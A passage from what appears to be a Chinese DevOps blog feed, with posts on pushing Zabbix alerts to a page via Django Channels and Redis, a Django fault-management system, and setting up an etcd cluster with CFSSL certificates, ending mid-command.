class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">pip install channels asgi_redis</div><div class="line">settings.py添加app和设置CHANNEL_LAYERS</div><div class="line"></div><div class="line">#commands是后面定义Django命令的app</div><div class="line">INSTALLED_APPS = [</div><div class="line">    &apos;django.contrib.admin&apos;,</div><div class="line">    &apos;django.contrib.auth&apos;,</div><div class="line">    &apos;django.contrib.contenttypes&apos;,</div><div class="line">    &apos;django.contrib.sessions&apos;,</div><div class="line">    &apos;django.contrib.messages&apos;,</div><div class="line">    &apos;django.contrib.staticfiles&apos;,</div><div class="line">    &apos;channels&apos;,</div><div class="line">    &apos;commands&apos;</div><div class="line">]</div><div class="line"></div><div class="line">#Redis信息</div><div class="line">REDIS_OPTIONS = &#123;</div><div class="line">    &apos;HOST&apos;: &apos;127.0.0.1&apos;,</div><div class="line">    &apos;PORT&apos;: 6379,</div><div class="line">    &apos;PASSWD&apos;: &apos;geekwolf&apos;,</div><div class="line">    &apos;DB&apos;: 0</div><div class="line">&#125;</div><div class="line"></div><div class="line">#可以使用内存存储Channels消息</div><div class="line">#CHANNEL_LAYERS = &#123;</div><div class="line">#    &quot;default&quot;: &#123;</div><div class="line">#        &quot;BACKEND&quot;: &quot;asgiref.inmemory.ChannelLayer&quot;,</div><div class="line">#        &quot;ROUTING&quot;: &quot;channels_example.routing.channel_routing&quot;,</div><div class="line">#    &#125;,</div><div class="line">#&#125;</div><div class="line"></div><div class="line">#使用Redis作为消息存储，需安装asgi_redis</div><div class="line">CHANNEL_LAYERS = &#123;</div><div class="line">    &apos;default&apos;: &#123;</div><div class="line">        &apos;BACKEND&apos;: &apos;asgi_redis.RedisChannelLayer&apos;,</div><div class="line">        &apos;CONFIG&apos;: &#123;</div><div class="line">            &apos;hosts&apos;: [&apos;redis://:&#123;0&#125;@&#123;1&#125;:&#123;2&#125;/&#123;3&#125;&apos;.format(REDIS_OPTIONS[&apos;PASSWD&apos;], REDIS_OPTIONS[&apos;HOST&apos;], REDIS_OPTIONS[&apos;PORT&apos;], 1)]</div><div class="line">        &#125;,</div><div class="line">        &apos;ROUTING&apos;: &apos;plonvol.routing.channel_routing&apos;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">#Redis频道和Channels群组名</div><div class="line">GROUP_NAME = &apos;alarm&apos;</div></pre></td></tr></table></figure>
<h6 id="添加路由-routing-py"><a href="#添加路由-routing-py" class="headerlink" title="添加路由(routing.py)"></a>添加路由(routing.py)</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"># -*- coding: utf-8 -*-</div><div class="line">from channels.routing import route</div><div class="line">from .consumers import ws_connect, ws_disconnect, ws_receive</div><div class="line"></div><div class="line"></div><div class="line">channel_routing = [</div><div class="line">    route(&apos;websocket.connect&apos;, ws_connect),</div><div class="line">    route(&apos;websocket.disconnect&apos;, ws_disconnect),</div><div class="line">]</div></pre></td></tr></table></figure>
<h6 id="添加consumers文件-类似view-consumers-py"><a href="#添加consumers文件-类似view-consumers-py" class="headerlink" title="添加consumers文件(类似view)(consumers.py)"></a>添加consumers文件(类似view)(consumers.py)</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"># -*- coding: utf-8 -*-</div><div class="line">from channels import Group</div><div class="line">from channels.handler import AsgiHandler</div><div class="line">from django.conf import settings</div><div class="line"></div><div class="line">def ws_connect(message):</div><div class="line">    message.reply_channel.send(&#123;&apos;accept&apos;: True&#125;)</div><div class="line">    Group(settings.GROUP_NAME).add(message.reply_channel)</div><div class="line"></div><div class="line"></div><div class="line">def ws_disconnect(message):</div><div class="line">    Group(settings.GROUP_NAME).discard(message.reply_channel)</div></pre></td></tr></table></figure>
<h6 id="订阅Redis报警消息脚本-commands-management-commands-alert-py"><a href="#订阅Redis报警消息脚本-commands-management-commands-alert-py" class="headerlink" title="订阅Redis报警消息脚本(commands/management/commands/alert.py)"></a>订阅Redis报警消息脚本(commands/management/commands/alert.py)</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"># -*- coding: utf-8 -*-</div><div class="line">import json</div><div class="line">import logging</div><div class="line">from channels import Group</div><div class="line">from django.core.management import BaseCommand</div><div class="line">from django.conf import settings</div><div class="line">import redis</div><div class="line"></div><div class="line">logger = logging.getLogger(__name__)</div><div class="line"></div><div class="line">class Command(BaseCommand):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    Command to start zabbix alert worker from command line.</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    help = &apos;Subscribe the zabbix alerts channel&apos;</div><div class="line"></div><div class="line">    def handle(self, *args, **options):</div><div class="line">        rc = redis.Redis(host=settings.REDIS_OPTIONS[&apos;HOST&apos;],</div><div class="line">                         password=settings.REDIS_OPTIONS[&apos;PASSWD&apos;],</div><div class="line">                         port=settings.REDIS_OPTIONS[&apos;PORT&apos;],</div><div class="line">                         db=settings.REDIS_OPTIONS[&apos;DB&apos;])</div><div class="line">        rc.delete(settings.GROUP_NAME)</div><div class="line">        pubsub = rc.pubsub()</div><div class="line">        pubsub.subscribe(settings.GROUP_NAME)</div><div class="line">        for item in pubsub.listen():</div><div class="line">            if item[&apos;type&apos;] == &apos;message&apos;:</div><div class="line">                Group(settings.GROUP_NAME).send(&#123;&apos;text&apos;: bytes.decode(item[&apos;data&apos;])&#125;)</div><div class="line">                logger.debug(&apos;send a message %s &apos; % item)</div></pre></td></tr></table></figure>
<h6 id="前端页面base-html"><a href="#前端页面base-html" class="headerlink" title="前端页面base.html"></a>前端页面base.html</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&lt;!-- 报警声音 --&gt;</div><div class="line">&lt;audio id=&quot;notify&quot;&gt;&lt;source src=&quot;/static/notify.ogg&quot; type=&quot;audio/ogg&quot;&gt;&gt;&lt;/audio&gt;</div><div class="line"></div><div class="line">&lt;script type=&quot;application/javascript&quot;&gt;</div><div class="line">    var ws_scheme = window.location.protocol == &quot;https:&quot; ? &quot;wss&quot; : &quot;ws&quot;;</div><div class="line">    var ws = new WebSocket(ws_scheme + &apos;://&apos; + window.location.host + window.location.pathname);</div><div class="line">    console.log(ws);</div><div class="line">    ws.onmessage = function (message) &#123;</div><div class="line">        var data = JSON.parse(message.data);</div><div class="line">        if(data[&apos;当前状态&apos;] == &apos;Problem&apos;)</div><div class="line">        &#123;</div><div class="line">           var subject = &apos;&lt;br&gt;故障！,服务器:&apos; + data[&apos;告警主机&apos;] + &apos;发生:&apos; + data[&apos;告警信息&apos;] + &apos;故障!&lt;br&gt;&apos;;</div><div class="line">        &#125;</div><div class="line">        else&#123;</div><div class="line">           var subject = &apos;&lt;br&gt;恢复！,服务器:&apos; + data[&apos;告警主机&apos;] + &apos;发生:&apos; + data[&apos;告警信息&apos;] + &apos;已经恢复!&lt;br&gt;&apos;;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">        content = new Array();</div><div class="line">        $.each(data,function(k,v)&#123;</div><div class="line">            content.push(&quot;&lt;b&gt;&quot; + k + &apos;:&lt;/b&gt;   &apos; + v)</div><div class="line">        &#125;)</div><div class="line">        var data = subject + content.join(&quot;&lt;br&gt;&quot;)</div><div class="line">        $(&apos;#notify&apos;)[0].play();</div><div class="line">        notify(&apos;warning&apos;,&apos;glyphicon glyphicon-danger-sign&apos;,data);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<h6 id="测试消息，用于发布消息到Redis"><a href="#测试消息，用于发布消息到Redis" class="headerlink" title="测试消息，用于发布消息到Redis"></a>测试消息，用于发布消息到Redis</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">import redis</div><div class="line">import json</div><div class="line"></div><div class="line">rc = redis.Redis(host=&apos;127.0.0.1&apos;, password=&apos;geekwolf&apos;, port=6379, db=0)</div><div class="line">msg = &#123;&quot;告警主机&quot;: &quot;web-server-node1&quot;, &quot;告警地址&quot;: &quot;192.168.1133.11&quot;, &quot;告警时间&quot;: &quot;2017-11-11 05:05:22&quot;, &quot;告警等级&quot;: &quot;严重&quot;,</div><div class="line">       &quot;告警信息&quot;: &quot;Web端口80监控&quot;, &quot;问题详情&quot;: &quot;80端口连接失败&quot;, &quot;当前状态&quot;: &quot;Problem&quot;, &quot;事件ID&quot;: &quot;12345&quot;&#125;</div><div class="line"></div><div class="line">rc.publish(&apos;alarm&apos;, json.dumps(msg))</div></pre></td></tr></table></figure>
<h6 id="运行服务，测试"><a href="#运行服务，测试" class="headerlink" title="运行服务，测试"></a>运行服务，测试</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">启动项目(http/websocket):</div><div class="line">python manage.py runserver 0.0.0.0:8000</div><div class="line">启动监听报警消息进程:</div><div class="line">python manage.py alert</div></pre></td></tr></table></figure>
<p>访问<a href="http://192.168.1.1:8000,运行test.py脚本" target="_blank" rel="external">http://192.168.1.1:8000,运行test.py脚本</a><br><img src="http://ow1schdt5.bkt.clouddn.com/ws-warn.png" alt="image"></p>
<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><blockquote>
<ul>
<li>利用Socket.IO实现消息实时推送 <a href="http://www.wukai.me/2017/08/27/push-message-with-socketio/" target="_blank" rel="external">http://www.wukai.me/2017/08/27/push-message-with-socketio/</a></li>
<li>WebSocket相关资料 <a href="http://www.52im.net/thread-331-1-1.html" target="_blank" rel="external">http://www.52im.net/thread-331-1-1.html</a></li>
<li>WSGI规范 <a href="http://wsgi.tutorial.codepoint.net/application-interface" target="_blank" rel="external">http://wsgi.tutorial.codepoint.net/application-interface</a></li>
<li>Channels文档:<a href="http://channels.readthedocs.io" target="_blank" rel="external">http://channels.readthedocs.io</a></li>
<li>Chat Example： <a href="https://gearheart.io/blog/creating-a-chat-with-django-channels/" target="_blank" rel="external">https://gearheart.io/blog/creating-a-chat-with-django-channels/</a></li>
<li>Websocket 5分钟从入门到精通 <a href="https://segmentfault.com/a/1190000012709475" target="_blank" rel="external">https://segmentfault.com/a/1190000012709475</a></li>
</ul>
</blockquote>
]]></content>
      
        
        <tags>
            
            <tag> WebSocket </tag>
            
            <tag> 消息推送 </tag>
            
            <tag> Zabbix 实时告警到页面 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[运维故障管理系统FMS]]></title>
      <url>/2017/09/12/devops-fms.html</url>
      <content type="html"><![CDATA[<h4 id="背景说明"><a href="#背景说明" class="headerlink" title="背景说明"></a>背景说明</h4><p>考虑到日常运维中涉及到故障的记录、统计等需求，针对不同的产品线、故障类型、级别等开发了运维故障管理系统FMS</p>
<blockquote>
<p>善于总结故障，刨根问底，方可预防，减少避免类似问题的出现</p>
</blockquote>
<h4 id="项目说明"><a href="#项目说明" class="headerlink" title="项目说明"></a>项目说明</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Python: 3.6</div><div class="line">Django: 1.11.0</div><div class="line">项目地址: git@github.com:geekwolf/fms.git</div></pre></td></tr></table></figure>
<h4 id="功能说明"><a href="#功能说明" class="headerlink" title="功能说明"></a>功能说明</h4><ul>
<li>故障管理(类型、级别等)</li>
<li>项目管理(针对区分不同业务线)</li>
<li>用户管理(用户、用户组)</li>
<li>权限管理</li>
<li>统计Dashboard</li>
</ul>
<h4 id="部署配置"><a href="#部署配置" class="headerlink" title="部署配置"></a>部署配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip3 install -i https://pypi.douban.com/simple/  -r requirements.txt</div></pre></td></tr></table></figure>
<p>MySQL配置修改settings.py:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">DATABASES = &#123;</div><div class="line">    <span class="string">'default'</span>: &#123;</div><div class="line">        <span class="string">'ENGINE'</span>: <span class="string">'django.db.backends.mysql'</span>,</div><div class="line">        <span class="string">'NAME'</span>: <span class="string">'fms'</span>,</div><div class="line">        <span class="string">'USER'</span>: <span class="string">'root'</span>,</div><div class="line">        <span class="string">'PASSWORD'</span>: <span class="string">'xxxx'</span>,</div><div class="line">        <span class="string">'HOST'</span>: <span class="string">'127.0.0.1'</span>,</div><div class="line">        <span class="string">'PORT'</span>: <span class="string">'3306'</span>,</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>修改故障通知邮箱settings.py:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">EMAIL_BACKEND = <span class="string">'django.core.mail.backends.smtp.EmailBackend'</span></div><div class="line">EMAIL_USE_TLS = <span class="keyword">False</span></div><div class="line">EMAIL_HOST = <span class="string">'service.simlinux.com'</span></div><div class="line">EMAIL_PORT = <span class="number">25</span></div><div class="line">EMAIL_HOST_USER = <span class="string">'admin@service.simlinux.com'</span></div><div class="line">EMAIL_HOST_PASSWORD = <span class="string">'xxx'</span></div><div class="line">DEFAULT_FROM_EMAIL = <span class="string">'geekwolf &lt;admin@service.simlinux.com&gt;'</span></div></pre></td></tr></table></figure></p>
<h4 id="初始化数据"><a href="#初始化数据" class="headerlink" title="初始化数据"></a>初始化数据</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">python manage.py makemigrations</div><div class="line">python manage.py migrate</div><div class="line">python manage.py loaddata default_types</div><div class="line">python manage.py loaddata default_user</div></pre></td></tr></table></figure>
<p>登录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">python manage.py runserver</div><div class="line">http://127.0.0.1:8000</div><div class="line">admin admin</div></pre></td></tr></table></figure></p>
<h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><p><img src="http://ow1schdt5.bkt.clouddn.com/fms/dashboard.jpg" alt=""><br><img src="http://ow1schdt5.bkt.clouddn.com/fms/fms.jpg" alt=""><br><img src="http://ow1schdt5.bkt.clouddn.com/fms/add_fms.jpg" alt=""><br><img src="http://ow1schdt5.bkt.clouddn.com/fms/add_user.jpg" alt=""><br><img src="http://ow1schdt5.bkt.clouddn.com/fms/group_perm.jpg" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> DevOps </tag>
            
            <tag> 运维故障管理系统 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[k8s部署之分布式KV存储Etcd]]></title>
      <url>/2017/09/08/k8s-etcd-deploy-test.html</url>
      <content type="html"><![CDATA[<h4 id="Etcd是什么"><a href="#Etcd是什么" class="headerlink" title="Etcd是什么"></a>Etcd是什么</h4><blockquote>
<p>Etcd是一个分布式、使用Raft算法维护一致性的kv存储系统，与其类似产品有Zookeeper(老牌经典)、Consul等，Etcd相对ZK，更加轻量、易运维。具体三者之间的对比可参考 <a href="https://luyiisme.github.io/2017/04/22/spring-cloud-service-discovery-products/" target="_blank" rel="external">https://luyiisme.github.io/2017/04/22/spring-cloud-service-discovery-products/</a></p>
</blockquote>
<h4 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h4><p>和zk、consul等类似，使用场景多用于:</p>
<ul>
<li>服务发现</li>
<li>消息发布与订阅</li>
<li>负载均衡</li>
<li>分布式锁</li>
<li>分布式队列</li>
</ul>
<h4 id="读写性能"><a href="#读写性能" class="headerlink" title="读写性能"></a>读写性能</h4><p>压测数据参考官方：<br><a href="https://coreos.com/etcd/docs/latest/op-guide/performance.html" target="_blank" rel="external">https://coreos.com/etcd/docs/latest/op-guide/performance.html</a></p>
<h4 id="本地集群部署"><a href="#本地集群部署" class="headerlink" title="本地集群部署"></a>本地集群部署</h4><ul>
<li>操作系统:Debian8 x64</li>
<li>Etcd v3.2.7</li>
</ul>
<p>A. 安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">wget https://github.com/coreos/etcd/releases/download/v3.2.7/etcd-v3.2.7-linux-arm64.tar.gz</div><div class="line">tar xf etcd-v3.2.7-linux-arm64.tar.gz</div><div class="line">cd etcd-v3.2.7-linux-amd64</div><div class="line">cp etc* /usr/local/bin/</div><div class="line"></div><div class="line">etcd: Etcd服务端文件</div><div class="line">etcdctl: 供用户使用的命令客户端</div></pre></td></tr></table></figure></p>
<p>B. 启动服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">root@a4c8d490:/home/geekwolf# etcd</div><div class="line">2017-09-07 15:42:23.957656 I | etcdmain: etcd Version: 3.2.7</div><div class="line">2017-09-07 15:42:23.957699 I | etcdmain: Git SHA: bb66589</div><div class="line">2017-09-07 15:42:23.957718 I | etcdmain: Go Version: go1.8.3</div><div class="line">2017-09-07 15:42:23.957723 I | etcdmain: Go OS/Arch: linux/amd64</div><div class="line">2017-09-07 15:42:23.957729 I | etcdmain: setting maximum number of CPUs to 8, total number of available CPUs is 8</div><div class="line">2017-09-07 15:42:23.957739 W | etcdmain: no data-dir provided, using default data-dir ./default.etcd</div><div class="line">2017-09-07 15:42:23.957764 N | etcdmain: the server is already initialized as member before, starting as etcd member...</div><div class="line">2017-09-07 15:42:23.957995 I | embed: listening for peers on http://localhost:2380</div><div class="line">2017-09-07 15:42:23.958107 I | embed: listening for client requests on localhost:2379</div><div class="line">2017-09-07 15:42:23.964607 I | etcdserver: name = default</div><div class="line">2017-09-07 15:42:23.964633 I | etcdserver: data dir = default.etcd</div><div class="line">2017-09-07 15:42:23.964652 I | etcdserver: member dir = default.etcd/member</div><div class="line">2017-09-07 15:42:23.964657 I | etcdserver: heartbeat = 100ms</div><div class="line">2017-09-07 15:42:23.964663 I | etcdserver: election = 1000ms</div><div class="line">2017-09-07 15:42:23.964668 I | etcdserver: snapshot count = 100000</div><div class="line">2017-09-07 15:42:23.964680 I | etcdserver: advertise client URLs = http://localhost:2379</div><div class="line">2017-09-07 15:42:23.973007 I | etcdserver: restarting member 8e9e05c52164694d in cluster cdf818194e3a8c32 at commit index 14</div><div class="line">2017-09-07 15:42:23.973041 I | raft: 8e9e05c52164694d became follower at term 2</div><div class="line">2017-09-07 15:42:23.973065 I | raft: newRaft 8e9e05c52164694d [peers: [], term: 2, commit: 14, applied: 0, lastindex: 14, lastterm: 2]</div><div class="line">2017-09-07 15:42:23.984367 W | auth: simple token is not cryptographically signed</div><div class="line">2017-09-07 15:42:23.993237 I | etcdserver: starting server... [version: 3.2.7, cluster version: to_be_decided]</div><div class="line">2017-09-07 15:42:23.993659 I | etcdserver/membership: added member 8e9e05c52164694d [http://localhost:2380] to cluster cdf818194e3a8c32</div><div class="line">2017-09-07 15:42:23.993754 N | etcdserver/membership: set the initial cluster version to 3.2</div><div class="line">2017-09-07 15:42:23.993796 I | etcdserver/api: enabled capabilities for version 3.2</div><div class="line">2017-09-07 15:42:24.473288 I | raft: 8e9e05c52164694d is starting a new election at term 2</div><div class="line">2017-09-07 15:42:24.473451 I | raft: 8e9e05c52164694d became candidate at term 3</div><div class="line">2017-09-07 15:42:24.473519 I | raft: 8e9e05c52164694d received MsgVoteResp from 8e9e05c52164694d at term 3</div><div class="line">2017-09-07 15:42:24.473568 I | raft: 8e9e05c52164694d became leader at term 3</div><div class="line">2017-09-07 15:42:24.473605 I | raft: raft.node: 8e9e05c52164694d elected leader 8e9e05c52164694d at term 3</div><div class="line">2017-09-07 15:42:24.478746 I | etcdserver: published &#123;Name:default ClientURLs:[http://localhost:2379]&#125; to cluster cdf818194e3a8c32</div><div class="line">2017-09-07 15:42:24.478824 I | embed: ready to serve client requests</div><div class="line">2017-09-07 15:42:24.479116 N | embed: serving insecure client requests on 127.0.0.1:2379, this is strongly discouraged!</div></pre></td></tr></table></figure></p>
<p>由上面的输出可知：</p>
<ul>
<li>etcd服务之间通信端口是2380，暴露给客户端端口为2379</li>
<li>默认将数据存放到当前路径default.etcd/目录下</li>
<li>该节点的名称默认为default</li>
<li>集群和节点都会生成唯一的uuid</li>
<li>启动服务时，会根据raft算法，选举leader</li>
</ul>
<p>C. 测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">查看api版本（默认api版本是v2）</div><div class="line">root@a4c8d490:~/k8s/etcd-v3.2.7-linux-amd64# etcdctl  --version</div><div class="line">etcdctl version: 3.2.7</div><div class="line">API version: 2</div><div class="line"></div><div class="line">使用API V3方法：</div><div class="line">Etcd服务端和客户端添加变量 export ETCDCTL_API=3,重新启动etcd服务即可</div><div class="line">以下操作在api v3版本:</div><div class="line">写入key: etcdctl put foo bar</div><div class="line">读取key: etcdctl get foo</div><div class="line">多key范围读取: etcdctl get foo foo9(会将foo..foo8的key读取,不包括foo9)</div><div class="line">读取过往版本key的值(Etcd键值对的修改都会增加全局修订版本号,--rev为版本号):</div><div class="line"> etcdctl get --rev=4 foo foo9</div><div class="line">删除key: etcdctl del foo</div><div class="line">范围删除(foo-&amp;gt;foo9):etcdctl del foo foo9</div><div class="line">观察key变化:etcdctl watch foo</div><div class="line">观察范围key变化: etcdctl watch foo foo9</div><div class="line">从rev=2版本开始观察key变化: etcdctl watch --rev=2 foo</div><div class="line">压缩版本5之前的修订版本(压缩后5之前的版本不可能访问): etcdctl compact 5</div><div class="line">授予key有效期:</div><div class="line">创建租约: </div><div class="line">$ etcdctl lease grant 10</div><div class="line">lease 694d5e5b63a74f31 granted with TTL(10s)</div><div class="line">附加key foo到租约694d5e5b63a74f31，该租约过期后，会删除附加的所有key</div><div class="line">撤销租约(撤销后，附加改租约的所有key被删除): etcdctl lease revoke 32695410dcc0ca06</div><div class="line">维持租约(执行后，会一直维持该租约): etcdctl lease keep-alive 32695410dcc0ca0</div><div class="line"></div><div class="line">其他参数可参考 etcdctl --help</div><div class="line">通过HTTP操作：</div><div class="line">Etcd v2: https://coreos.com/etcd/docs/latest/v2/api.html</div><div class="line">Etcd v3: https://coreos.com/etcd/docs/latest/dev-guide/api_grpc_gateway.html</div></pre></td></tr></table></figure></p>
<h4 id="多节点集群部署"><a href="#多节点集群部署" class="headerlink" title="多节点集群部署"></a>多节点集群部署</h4><h5 id="静态模式部署"><a href="#静态模式部署" class="headerlink" title="静态模式部署"></a>静态模式部署</h5><h6 id="环境说明-三节点集群"><a href="#环境说明-三节点集群" class="headerlink" title="环境说明(三节点集群)"></a>环境说明(三节点集群)</h6><table>
<thead>
<tr>
<th style="text-align:left">节点</th>
<th style="text-align:left">地址</th>
<th style="text-align:left">主机</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">etcd1</td>
<td style="text-align:left">192.168.234.133</td>
<td style="text-align:left">etcd1.simlinux.com</td>
</tr>
<tr>
<td style="text-align:left">etcd2</td>
<td style="text-align:left">192.168.234.134</td>
<td style="text-align:left">etcd2.simlinux.com</td>
</tr>
<tr>
<td style="text-align:left">etcd3</td>
<td style="text-align:left">192.168.234.135</td>
<td style="text-align:left">etcd3.simlinux.com</td>
</tr>
</tbody>
</table>
<h6 id="初始化环境"><a href="#初始化环境" class="headerlink" title="初始化环境"></a>初始化环境</h6><p>三个节点分别设置主机名:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">hostnamectl --static  set-hostname etcd1.simlinux.com</div><div class="line">hostnamectl --static  set-hostname etcd2.simlinux.com</div><div class="line">hostnamectl --static  set-hostname etcd3.simlinux.com</div></pre></td></tr></table></figure></p>
<p>三个节点hosts文件添加:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">vim /etc/hosts</div><div class="line">192.168.234.133 etcd1.simlinux.com </div><div class="line">192.168.234.134 etcd2.simlinux.com </div><div class="line">192.168.234.135 etcd3.simlinux.com</div></pre></td></tr></table></figure></p>
<p><strong>生成etcd证书(用于etcd间、客户端与etcd通信)</strong></p>
<blockquote>
<ul>
<li>etcdctl等客户端与etcd服务通信证书</li>
<li>etcd服务之间通信证书</li>
</ul>
<p>由上篇<a href="http://blog.simlinux.com/archives/1953.html" target="_blank" rel="external">k8s部署之使用CFSSL创建证书</a>的CA来生成</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">cat  etcd.json </div><div class="line">&#123;</div><div class="line">    &quot;CN&quot;: &quot;etcd&quot;,</div><div class="line">    &quot;hosts&quot;: [</div><div class="line">        &quot;127.0.0.1&quot;,</div><div class="line">        &quot;192.168.234.133&quot;,</div><div class="line">        &quot;192.168.234.134&quot;,</div><div class="line">        &quot;192.168.234.135&quot;</div><div class="line">    ],</div><div class="line">    &quot;key&quot;: &#123;</div><div class="line">        &quot;algo&quot;: &quot;ecdsa&quot;,</div><div class="line">        &quot;size&quot;: 256</div><div class="line">    &#125;,</div><div class="line">    &quot;names&quot;: [</div><div class="line">        &#123;</div><div class="line">            &quot;C&quot;: &quot;CN&quot;,</div><div class="line">            &quot;L&quot;: &quot;ShangHai&quot;,</div><div class="line">            &quot;ST&quot;: &quot;ShangHai&quot;,</div><div class="line">            &quot;O&quot;: &quot;K8s&quot;,</div><div class="line">            &quot;OU&quot;: &quot;System&quot;</div><div class="line">        &#125;</div><div class="line">    ]</div><div class="line">&#125;</div><div class="line">生成服务端证书,用于服务端认证客户端(hosts需要包括允许访问ETCD Cluster的IP或者FQDN):</div><div class="line">cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=server server-csr.json | cfssljson 